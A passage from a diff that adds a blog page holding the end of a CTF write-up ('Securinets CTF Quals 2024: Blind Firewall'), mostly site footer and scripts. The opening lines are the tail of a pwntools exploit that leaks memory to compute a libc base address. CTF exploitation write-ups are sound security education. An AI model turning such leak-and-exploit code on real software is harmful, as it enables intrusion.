class="line">pause_shit_for_a_while()</span><br><span class="line">setup_out_data(<span class="number">2</span>, p64(<span class="number">0xffffffffffffff</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libcbase = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    libcbase = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">    log.success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">libcbase -= <span class="number">0x21a803</span></span><br><span class="line">log.success(<span class="string">&quot;libcbase: &quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+      <!--
+     --><li style="display: block;">
+        <span style="display: flex; align-items: center;">
+          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
+            <title>Home</title>
+            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
+          </svg>
+          <a href="../../../../index.html">Home</a>
+        </span>
+      </li><!--
+     --><li style="display: block;">
+        <span style="display: flex; align-items: center;">
+          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
+            <title>Writing</title>
+            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
+          </svg>
+          <a href="../../../../archives/">Writing</a>
+        </span>
+      </li><!--
+     --><li style="display: block;">
+        <span style="display: flex; align-items: center;">
+          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
+            <title>Projects</title>
+            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
+          </svg>
+          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
+        </span>
+      </li>
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&text=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&is_video=false&description=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Securinets CTF Quals 2024: Blind Firewall&body=Check out this article: https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&title=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&name=Securinets CTF Quals 2024: Blind Firewall&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2024/10/17/Securinets-CTF-Quals-2024-Blind-Firewall/&t=Securinets CTF Quals 2024: Blind Firewall"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Xia0o0o0o
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+        <!-- -->
+        <!-- <li><a href="../../../../index.html">Home</a></li> -->
+        <!-- -->
+
+        
+        <a href="../../../../index.html">Home</a>
+        
+
+       <!-- -->
+       
+        <!-- -->
+        <!-- <li><a href="../../../../archives/">Writing</a></li> -->
+        <!-- -->
+
+        
+        <a href="../../../../archives/">Writing</a>
+        
+
+       <!-- -->
+       
+        <!-- -->
+        <!-- <li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li> -->
+        <!-- -->
+
+        
+        <a target="_blank" rel="noopener" href="https://github.com/KpwnZ">Projects</a>
+        
+
+       <!-- -->
+       
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="../../../../js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
